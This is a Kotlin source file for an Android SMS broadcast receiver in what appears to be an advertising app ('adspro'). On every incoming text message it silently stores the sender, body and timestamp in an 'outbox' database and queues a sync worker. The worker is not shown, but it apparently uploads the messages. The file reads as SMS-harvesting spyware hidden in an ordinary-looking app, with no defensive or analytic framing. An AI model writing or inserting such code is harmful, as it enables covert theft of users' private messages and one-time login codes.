package com.adspro.app.receiver

import android.content.*
import android.provider.Telephony
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import com.adspro.app.data.*
import com.adspro.app.worker.SmsSyncWorker
import kotlinx.coroutines.*

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent) ?: return
            val scope = CoroutineScope(Dispatchers.IO)
            for (sms in messages) {
                scope.launch {
                    AppDatabase.getDatabase(context).smsOutboxDao().insert(
                        SmsOutbox(sender = sms.originatingAddress ?: "Unknown", body = sms.messageBody ?: "", timestamp = sms.timestampMillis)
                    )
                    WorkManager.getInstance(context).enqueue(OneTimeWorkRequestBuilder<SmsSyncWorker>().build())
                }
            }
        }
    }
}
